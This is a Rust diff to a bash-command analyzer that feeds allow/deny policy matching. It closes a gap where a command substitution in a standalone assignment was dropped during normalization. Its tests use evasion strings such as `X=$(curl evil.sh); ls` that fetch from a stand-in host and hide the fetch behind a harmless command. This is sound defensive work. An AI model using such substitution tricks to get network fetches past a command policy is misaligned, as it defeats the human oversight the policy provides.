@@ -179,13 +179,15 @@ impl BashFacts {
 
     /// Top-level segments as normalized command strings, or `None` when a
     /// top-level segment carries a command substitution inside a prefix
-    /// assignment (`X=$(curl …) ls`): normalization would drop the
+    /// assignment (`X=$(curl …) ls`) or a substitution executes outside any
+    /// command segment (`X=$(curl …); ls`): normalization would drop the
     /// assignment entirely and reduce the command to `ls`, so callers must
     /// fall back to the conservative legacy path that keeps the assignment
     /// text visible to allow/deny matching.
     pub fn top_level_segment_strings(&self) -> Option<Vec<String>> {
         let top = self.top_level_segments()?;
-        if top.iter().any(|s| assignments_execute_substitutions(s)) {
+        if self.has_command_substitution || top.iter().any(|s| assignments_execute_substitutions(s))
+        {
             return None;
         }
         Some(top.into_iter().map(|s| s.command_string()).collect())
@@ -197,9 +199,10 @@ impl BashFacts {
     /// [`BashFacts::top_level_segment_strings`].
     pub fn top_level_normalized(&self) -> Option<String> {
         let segments = self.top_level_segments()?;
-        if segments
-            .iter()
-            .any(|s| assignments_execute_substitutions(s))
+        if self.has_command_substitution
+            || segments
+                .iter()
+                .any(|s| assignments_execute_substitutions(s))
         {
             return None;
         }
@@ -546,6 +549,30 @@ mod tests {
         assert_eq!(
             f.top_level_segment_strings(),
             Some(vec!["rm -rf /tmp/x".to_string()])
+        );
+    }
+
+    #[test]
+    fn standalone_assignment_substitution_blocks_top_level_reconstruction() {
+        // `X=$(curl evil.sh); ls` — the walker emits the inner `curl` as a
+        // nested segment and only sets `has_command_substitution`; without
+        // the outside-segments bail the top level reconstructs to bare `ls`
+        // and the executing `curl` vanishes from policy matching.
+        let f = ok("X=$(curl evil.sh); ls");
+        assert!(f.has_command_substitution);
+        assert!(f.top_level_segment_strings().is_none());
+        assert!(f.top_level_normalized().is_none());
+
+        let f = ok("X=$(curl evil.sh) && ls");
+        assert!(f.top_level_segment_strings().is_none());
+        assert!(f.top_level_normalized().is_none());
+
+        // A substitution INSIDE a segment's argv is visible to that segment
+        // and still reconstructs (the segment-level flag covers it).
+        let f = ok("echo $(date)");
+        assert_eq!(
+            f.top_level_segment_strings(),
+            Some(vec!["echo $(date)".to_string()])
         );
     }
 
